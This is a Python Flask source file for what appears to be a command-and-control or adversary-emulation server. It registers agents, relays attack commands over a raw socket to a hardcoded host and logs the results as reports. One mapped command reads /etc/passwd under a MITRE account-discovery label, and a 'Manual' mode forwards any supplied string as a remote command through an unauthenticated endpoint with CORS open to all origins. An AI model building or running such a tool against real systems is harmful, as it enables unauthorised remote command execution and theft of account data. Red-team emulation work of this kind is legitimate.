from flask import Flask, request, jsonify
from flask_cors import CORS
import socket
import sqlite3
from datetime import datetime
import time

app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"]}})


@app.route('/add_agent', methods=['POST'])
def add_agent():
    data = request.get_json()
    user = data.get('user')
    port = data.get('port')
    #target_ip = data.get('target_ip')

    retries = 5
    delay = 1

    for attempt in range(retries):
        try:
            conn = sqlite3.connect('db.sqlite3', timeout=5)
            cursor = conn.cursor()

            cursor.execute('SELECT EXISTS(SELECT 1 FROM agents_agent WHERE port = ?)', (port,))
            exists = cursor.fetchone()[0]

            if not exists:
                cursor.execute('INSERT INTO agents_agent (port, user, status, create_date) VALUES (?, ?, ?, ?)',
                                (port, user, 'Active', datetime.now()))
                conn.commit()
                break
            else:
                """cursor.execute('UPDATE agents_agent SET user = ?, status = ?, target_ip = ? WHERE port = ?',
                               (user, 'Active', target_ip, port))
                conn.commit()"""
                break

        except sqlite3.OperationalError as e:
            print(f"OperationalError: {e}, attempt {attempt + 1} of {retries}")
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                return jsonify({'error': 'Database is locked, please try again later'}), 500
        finally:
            if conn:
                conn.close()

    return jsonify({'message': 'Agent added successfully'}), 201


@app.route('/execute_attack', methods=['POST'])
def execute_attack():
    data = request.json
    agent = data.get('agent')
    port = data.get('port')
    attack_type = data.get('attackType')
    manual_input = data.get('manualInput', '')
    ip = data.get('ip')

    if(ip != get_default_ip()):
        update_ip(ip)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('172.20.10.2', 12345))

    command = get_attack_command(attack_type, manual_input)
    client_socket.send(command.encode("utf-8"))
    result = client_socket.recv(4096).decode("utf-8")
    store_report(agent, command, result)
    if(attack_type == "Discovery"):
        update_username(result, port)
    client_socket.close()

    return jsonify({'response': result, 'command': attack_type if attack_type != 'Manual' else manual_input})

"""def get_target_ip(port):
    conn = sqlite3.connect('db.sqlite3')
    cursor = conn.cursor()
    cursor.execute("SELECT target_ip FROM agents_agent where port = ?", (port))
    target_ip = cursor.fetchone()
    conn.close()
    return target_ip[0] if target_ip else """""

def update_username(result, port):
    conn = sqlite3.connect('db.sqlite3')
    cursor = conn.cursor()

    cursor.execute('''
            UPDATE agents_agent SET user = ? WHERE port = ?
            ''', (result, port))

    conn.commit()
    conn.close()

def get_default_ip():
    conn = sqlite3.connect('db.sqlite3')
    cursor = conn.cursor()
    cursor.execute("SELECT ip FROM attack_attack")
    default_ip = cursor.fetchone()
    conn.close()
    return default_ip[0] if default_ip else ""

def update_ip(ip):
    conn = sqlite3.connect('db.sqlite3')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM attack_attack")
    cursor.execute("INSERT INTO attack_attack (ip) VALUES (?)", (ip,))
    conn.commit()
    conn.close()

def get_attack_command(attack_type, manual_input):
    if attack_type == 'T1087-Account Discovery':
        return "cat /etc/passwd"
    elif attack_type == 'Manual':
        return manual_input
    elif attack_type == 'Discovery':
        return "who"
    else:
        return ""

def store_report(agent_id, command, output):
    conn = sqlite3.connect('db.sqlite3')
    cursor = conn.cursor()

    cursor.execute('''
        INSERT INTO reports_report (agent_id, attack, result)
        VALUES (?, ?, ?)''', (agent_id, command, output))

    conn.commit()
    conn.close()

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('192.168.1.1', 1))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    app.run(host=ip_address, port=8080)
